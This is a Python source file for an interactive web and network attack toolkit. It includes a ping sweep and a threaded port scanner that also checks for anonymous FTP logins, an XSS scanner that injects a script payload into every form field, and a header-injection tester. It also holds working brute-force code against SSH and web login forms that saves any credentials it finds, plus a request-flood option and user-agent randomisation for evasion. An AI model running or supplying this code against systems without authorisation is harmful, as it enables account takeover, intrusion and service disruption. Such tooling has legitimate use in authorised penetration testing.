from data import *
# encrypt the file ceaser

# URL ENCODER
from pprint import pprint
import random
import sys
import subprocess
import requests
import socket
import time
import concurrent.futures
import ftplib
import paramiko

from pygments import highlight
from pygments.lexers import HtmlLexer
from pygments.formatters import TerminalFormatter

from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

tools = """
Tools   >   Command        Discription
            ———————        ———————————
            whois          Whois Lookup DNS Lookup Geolocation Lookup
            html           HTML Analyzer [inspect]
    !!      xss            Cross-Site-Scripting Scanner
    !!      sqli           SQL Injection Scanner
    !       hscan          HTTP Headers auto Scanner
            netscan        Network Scanner [ping scan] + [21,22,80,443,8080,8443] Port Scan
    !       robots         Extract Disallow URLs from robots.txt file
    !!      dirfuzz        Directory Fuzzer
    !!      filefuzz       File Fuzzer [files: apache, nginx, php, ...]
            subbrute       Subdomain Bruteforce
            pscan          Port Scanner [default=220 port]
            dorkscan       Search by Common Google Dorks & Subdomains
            jsscan         Javascript Files Scanner [get function names, get requests [axios, fetch(), HttpXml], get paths, tokens]
    !!      geterr         Send bad requests then get the response [404,403,500,405,414,501]
    !!      flood          Send A flood of requests
            
            info           Print The gathered information about the target
            H [header]     Add Header , example:  < H Origin >
            help           show help
            send           Send the request
            verbose        Change Verbose [ON/OFF]
            exit           Exit the program
            cm             Change Crawler Mode [ON/OFF]
            scraper        Scrape the website [download all files of the website]
            extract        Extract all [URLs, Comments, Subdomains, metadata, parameters, ]
            Date00000000000000000
            """


open_ports = []
subdomains = []
urls = {
    'js':[],
    'css':[],
    'php':[],
    'jsp':[],
    'asp':[],
    'htm':[],
    'html':[],
    
    'form':[],
    'media':[],
    'image':[],
    'iframe':[],
    
    'link-tag':[],
    
    'param':[],
    
    'internal':[],
    'external':[],
    
    'all':[],
}


def hide_techniqe():
    random_user_agent = random.choice(user_agent_list)
    random_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    random_delay = random.randint(7,20)

#--------------------------------
def RCE_SCANNER(url):
    ...
#--------------------------------
def SQLI_SCANNER(url):
    ...
#--------------------------------

def net_scan(host):
    ip = socket.gethostbyname(host)
    ports = [20,21,22,23,80,443]

    parts = ip.split('.')

    if sys.platform.startswith('win'): # platform == windows
        switch = '-n'
    else:                              # platform == linux
        switch = '-c'

    for i in range(255):
        try:
            open_ports = []
            ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{i}"
            cmd = f'ping {switch} 1 {ip}'
            run = subprocess.run(args=cmd.split(), shell=True, stdout=subprocess.PIPE )
            result = run.stdout.decode()

            if run.returncode == 0 and 'unreachable' not in result:
                print(f'    [+] {ip}')
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.4)
                for port in ports:
                    code = sock.connect_ex((host, port))
                      
                    if code == 0:                
                        # try:    banner = sock.recv(1024).decode().strip()
                        # except: banner = ''
                        # print(banner)
                        open_ports.append(port)
                print(f'    [+] {str(open_ports).replace("[", "").replace("]", "")}')
                    
            else:
                print(f'    [!] {ip}', end='\r')
        except KeyboardInterrupt:
            break
        except Exception as error:
            print(error)
#--------------------------------
def GET_ERROR_RESPONSE(url):
    # ----- 414 StatusCode Request-url Too Long -----
    longest_url = url + ('?param='+'JUGGLER'*5000)
    res = requests.get(longest_url, headers=static_headers)
    if res.status_code != 200:
        print('StatusCode:', res.status_code)
        SOUP = BeautifulSoup(res.content, 'html.parser')
        COLORED_CONTENT = highlight(SOUP.prettify(), HtmlLexer(), TerminalFormatter())
        print(COLORED_CONTENT)
        print('==========================================')
    # ----- 404 StatusCode Not Found -----
    notfound_url = url + '/ThisPageNotFound'
    res = requests.get(notfound_url, headers=static_headers)
    if res.status_code != 200:
        print('StatusCode:', res.status_code)
        SOUP = BeautifulSoup(res.content, 'html.parser')
        COLORED_CONTENT = highlight(SOUP.prettify(), HtmlLexer(), TerminalFormatter())
        print(COLORED_CONTENT)
    
#--------------------------------
def WHOIS_LOOKUP(host):
    source = f'https://www.whois.com/whois/{host}'
    response = requests.get(url=source, headers=static_headers)
    info = BeautifulSoup(response.text, 'html.parser').find('pre').text
    for line in info.split('\n'):
        print(line)


def DNS_LOOKUP(host):
    source = f"https://networkcalc.com/api/dns/lookup/{host}"
    response = requests.get(url=source, headers=static_headers)
    info = dict(response.json())
    pprint(info)


def GEO_LOOKUP(host):
    source = f'https://tools.keycdn.com/geo?host={host}'
    response = requests.get(url=source, headers=static_headers)
    soup = BeautifulSoup(response.text, "html.parser")
    key = soup.find_all("dt")
    value = soup.find_all("dd",{"class":"col-8 text-monospace"})
    for index in range(20):
        try:
            space = (17-len(key[index].text))*' '
            print(f'{key[index].text}:{space}{value[index].text}')
        except:
            ...
#--------------------------------
def SUBDOMAIN_EXTRACTOR(host, url_list):
    ip = socket.gethostbyname(host)
    if ip != host:
        host_parts = host.split('.')
        for url in url_list:
            netloc = urlparse(url).netloc
            netloc_parts = netloc.split('.')
            
            if len(netloc_parts) >= 3:
                if host_parts[-2]+host_parts[-1] == netloc_parts[-2]+netloc_parts[-1] and netloc not in subdomains:
                    subdomains.append(netloc)
#--------------------------------
def URLS_EXTRACTOR(soup, url, host):
    
    for e in urls:
        urls[e].clear()

    iframe_tags = soup.find_all('iframe')
    script_tags = soup.find_all('script')
    link_tags = soup.find_all('link')
    img_tags = soup.find_all('img')
    a_tags = soup.find_all('a')
    media_tags = soup.find_all('audio') + soup.find_all('video')
    form_tags = soup.find_all('form')
    

    for tag in form_tags:
        action = tag.attrs.get('action')
        if action:
            link = urljoin(url, action)
            urls['form'].append(link)
     
    for tag in iframe_tags:
        link = tag.attrs.get('src')
        if link:
            urls['iframe'].append(link)
    
    for tag in script_tags:
        src = tag.attrs.get('src')
        if src:
            js_url = urljoin(url, src)
            urls['js'].append(js_url)
    
    for tag in link_tags:
        href = tag.attrs.get('href')
        rel = tag.attrs.get('rel')
        if href and rel in ['stylesheet', 'Stylesheet', 'StyleSheet']:
            css_url = urljoin(url, href)
            urls['css'].append(css_url)
        else:
            link_url = urljoin(url, href)
            urls['link-tag'].append(link_url)
   
    for tag in img_tags:
        link = tag.attrs.get('src')
        if link:
            image_url = urljoin(url, link)
            if image_url.startswith('http'):
                urls['image'].append(image_url)

    for tag in a_tags:
        href = tag.attrs.get('href')
        if href:
            if not href.startswith('http'):
                href = urljoin(url, href)
            if '.php' in href:
                urls['php'].append(href)
            elif '.aspx' in href or '.asp' in href:
                urls['asp'].append(href)
            elif '.jsp' in href:
                urls['jsp'].append(href)
            else:
                if host in href:
                    urls['internal'].append(href)
                else:
                    urls['external'].append(href)

    for tag in media_tags:
        source_tags = tag.find_all("source")
        for source_tag in source_tags:
            src = source_tag.attrs.get('src')
            if src:
                media_url = urljoin(url, src)
                urls['media'].append(media_url)
    
    for i in urls:
        if urls[i] and i != 'all':
            print(f'\n {W}{i.upper()}-URLs')
            for link in set(urls[i]):
                if urlparse(link).query:
                    urls['param'].append(link)
                
                print(f'{g}    [+] {link}')
                urls['all'].append(link)
    
    SUBDOMAIN_EXTRACTOR(host, urls['all'])
    if subdomains:
        print(f'\n {W} Subdomains {RESET}')
        for subdomain in subdomains:
            print(f'{g}    [+] {subdomain}')
#------------------------------------------                
def PORT_SCANNER(host, portlist):
    
    timeout = float(input(f'       {W}|___ Enter Timeout Value: '))
    ip = socket.gethostbyname(host) 
    print(f'\n     {G}IP Address: {ip}{RESET}')
    print(f'     {GB}.———————.———————.——————————————.{RESETB}')
    print(f'     {GB}| PORT  | STATE | SERVICE      |{RESETB}{g} Banner/Info ')
    print(f'     {GB}|———————|———————|——————————————|{RESETB}{g} ———————————')

    def check_port(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            
            port_space = (6-len(str(port)))*' '
              
            if result == 0:                
                #if port in [80, 443] + list(range(1025, 65535)) :
                 #   sock.send( b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n')

                try:    banner = sock.recv(1024).decode().strip()
                except: banner = ''
                
                try:    service = socket.getservbyport(port , 'tcp')
                except: service = 'unknown'
                
                service_space  = (13-len(service))*' '
                
                if port == 21:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(host, 21, timeout=4)
                        ftp.login('anonymous', 'anonymous')
                        anon_access = ' / Anonymous Access: Allow'
                    except:
                        anon_access = ' / Anonymous Access: Disallow'
                else:
                    anon_access = ''

                print(f'     {GB}| {port}{port_space}| open  | {service}{service_space}|{RESETB}{g} {banner}{anon_access}')

                open_ports.append(port)
    
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(check_port, portlist)
    print(f'     {GB}|_______|_______|______________|{RESETB}')
    end = time.time()
    print(f'     {GB}Scanning has token {round(end-start, 2)} second. {RESETB}')

#---------------------------------------

def HTML_ANALYZER(soup):
    
    print(G)
    print('     .—————————————————————————————————————————.————————.')
    print('     | Tag Name     <Genral Info>              | Number |')
    print('     |—————————————————————————————————————————|————————|')

   
    for tag in tag_names_list:
        tag_space = (38-len(tag))*' '
        tag_list = soup.find_all(tag)
        number = len(tag_list)
        number_space = (6-len(str(number)))*' '
        if tag == 'form':
            for form in tag_list:
                has_script = bool(form.find('script'))
                method = form.attrs.get('method', '')
                method_space = (13-len(method))*' '
                print(f'     | <{tag}> {method}, Has JS Tag?: {has_script}{method_space}|  {len(str(number))}{number_space}|')
        else:          
            if number != 0:
                print(f'     | <{tag}>{tag_space}|  {number}{number_space}|')
    
    print('     |_________________________________________|________|')
    print(f'{g}     |_exit: Exit  &  all : All HTML Code\n')

    while True:
        try:
            target_tag = input(f'{g}     Target Tag : {w}')
            if target_tag.lower() == 'exit':
                return
        except KeyboardInterrupt:
            print()
            return
        if target_tag == 'all':
            COLORED_HTML = highlight(soup.prettify(), HtmlLexer(), TerminalFormatter())
            print(COLORED_HTML)
        target_tag_list = soup.find_all(target_tag)
        for tag in target_tag_list:
            COLORED_TAG = highlight(tag.prettify(), HtmlLexer(), TerminalFormatter())
            print('    ',COLORED_TAG)
            #print(w+'-'*40)
#---------------------------------------
def xss_scanner(url, headers):
    payload = '<ScrIPT>alert(0)</ScrIPT>'
    response = requests.get(url, headers=static_headers, timeout=10)
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
   
    #print('     +————————————————————+')
    print(f'     +  Detected {len(forms)} Form.  \n')
    #print('     +————————————————————+')

    for form in forms:
        method = form.attrs.get('method', 'GET')
        action = urljoin(url, form.attrs.get('action', ''))
        inputs = form.find_all_next('input')
        
        data = {}
        params = {}

        print('     + Method:', method)
        print('     + Action:', action)
        print('\n     +  Inputs         Injected-Payloads')
        print('     |  ——————         —————————————————')

        for Input in inputs:
            name = Input.attrs.get('name','')
            space = (12-len(name))*' '
            if name :
                print(f'     |_ {name} :{space} {payload}')
                if method.upper() == 'GET':
                    params[name] = payload
                else:
                    data[name] = payload

        res = requests.request(url=action, method=method, headers=headers, data=data, params=params)
        content = str(res.content)

        print()
        if payload in content:
            print('     [+] XSS Vulnerability Detected.')
            res2 = requests.get(url, headers=headers)
            if payload in str(res2.content):
                print('     [+] XSS Type: Stored')
            else:
                print('     [+] XSS Type: Reflected')
        else:
            print('     [x] No XSS Detected.')
        print('     ==============================================')
#---------------------------------------
def header_scanner(url):
    for key, value in vuln_headers.items():
        main_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=1000",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20100101 Firefox/33.0",
        }
        
        try:
            normal_res = requests.get(url=url, headers=main_headers, timeout=7)
            
            main_headers[key] = value
            res = requests.get(url=url, headers=main_headers, timeout=7)
            status = f'{res.status_code} {status_codes.get(res.status_code, "")}'
            length = len(str(res.content))
            headers_length = len(res.headers)

            print(f'     {w}[!] Testing Header > {Y}{key} : {G}{value}')

            if normal_res.status_code != res.status_code or length != len(str(normal_res.content)) or headers_length != len(normal_res.headers) :
                print(f'     [+] Req Header:  {key}: {value}')
                print(f'     [+] Res Status:  {status}')
                print(f'     [+] Res Length:  {length}')
                print(f'     [+] Res Headers: {headers_length}')
                for k,v in res.headers.items():
                    print(f'      |_ {k}: {v}')
                print()
        except KeyboardInterrupt:
            break
        except Exception as error:
            print(error)
            pass
        
#---------------------------------------
def parse_robots_txt(url):
    robots_url = url.rstrip("/") + "/robots.txt"
    try:
        response = requests.get(robots_url, timeout=10)
        if response.status_code != 200:
            print("    [!] Can't find robots.txt file")
            return
    except Exception as error:
        print(error)

    user_agents = []
    disallows = []

    for line in response.text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue  # Skip empty lines and comments

        # Match User-agent
        if line.lower().startswith("user-agent"):
            user_agent = line.split(":", 1)[1].strip()
            user_agents.append(user_agent)

        # Match Disallow
        elif line.lower().startswith("disallow"):
            disallow_path = line.split(":", 1)[1].strip()
            disallow_url = urljoin(url, disallow_path)
            print(f'    [+] {disallow_url}')

    return disallows

#---------------------------------------
def ssh_brute(req_host):
    def is_ssh_open(hostname, port, username, password):
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print(f"{R}   [!] Host: {hostname} is unreachable, timed out.{RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"        [!] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{B}    [*] Quota exceeded, retrying with delay...{RESET}")
            # sleep for a minute
            time.sleep(5)
            return is_ssh_open(hostname, port,username, password)
        else:
            # connection was established successfully
            print(f"{G}[+] Successful credentials:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True

    host = req_host
    port = int(input('        |__ Enter The Port (default=22): '))
    user = input('        |__ Enter The Username: ')
    passlist = 'wordlist/passwords.txt'
    
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        try:
            if is_ssh_open(host, port, user, password):
                # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{user}@{host}:{password}")
                break
        except KeyboardInterrupt:
            break
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


def brute_force_login(url):
    wordlist = open('wordlist/passwords.txt', 'r').read().splitlines()

    response = requests.request(url=url, method='GET', headers=static_headers)
    soup = BeautifulSoup(response.content, 'html.parser')

    form_tags = soup.find_all('form')

    print(f'\n[*] Forms Detected : {len(form_tags)}\n')
    if len(form_tags) == 0:
        time.sleep(2)
        exit()

    for form in form_tags:
        print(form)
        print('====================================')
    target_index = int(input('[?] Enter Index of Target Form : '))

    target_form = form_tags[target_index - 1]

    action = urljoin(url, target_form.attrs.get('action', ''))
    method =  target_form.attrs.get('method', 'GET')
    input_tags = target_form.find_all('input')

    print(f"\n[+] Form's Action: {action}")
    print(f"[+] Form's Method: {method}")
    print(f"[+] Form's Inputs: {len(input_tags)}")
    print(f'\n[*] Wordlist Length: {len(wordlist)}\n')

    data = {}

    for input_tag in input_tags:
        name = input_tag.attrs.get('name', '')
        type = input_tag.attrs.get('type', '')
        value = input_tag.attrs.get('value', '')
        if name :
            data[name] = input(f'Enter The Input => Name: {name},  Type: {type},  Value:{value}  : ')


    for key, value in data.items():
        if value.lower() == 'target':
            print('''
           .————————.——————————————————————————.————————.————————.————————————.
           | Number | Payload                  | Status | Length | Error-Word |
           |________|__________________________|________|________|____________| ''')
            for payload in wordlist:
                try:
                    data[key] = payload
                    r = requests.request(method=method, url=action, data=data, headers=static_headers)
                    
                    #lines = BeautifulSoup(r.content, 'html.parser').find('body').text.splitlines()
                    err_words = []
                    for word in error_wordlist:
                        if word in str(r.content):
                            error_word = word
                            break
                        else:
                            error_word = ''
                        
                        if word not in err_words:
                            err_words.append(word)

                    
                    #lines = BeautifulSoup(r.content, 'html.parser').find('body').text.splitlines()
                    length = len(str(r.content))
                    status = r.status_code
                    number = wordlist.index(payload)

                    if status in range(200,300):
                        status_color = g
                    elif status in range(300,400):
                        status_color = y
                    else:
                        status_color = r

                    payload_space = (25-len(payload))*' '
                    number_space = (7-len(str(number)))*' '
                    status_space = (7-(len(str(status))))*' '
                    length_space = (7-len(str(length)))*' '
                    error_word_space = (11-len(error_word))*' '
                    
                    print(f'           | {number}{number_space}| {payload}{payload_space}| {status_color}{status}{status_space}{RESET}| {length}{length_space}| {error_word}{error_word_space}|')
                    print(f'           |________|__________________________|________|________|____________| ', end='\r')
                except KeyboardInterrupt:
                    print()
                    break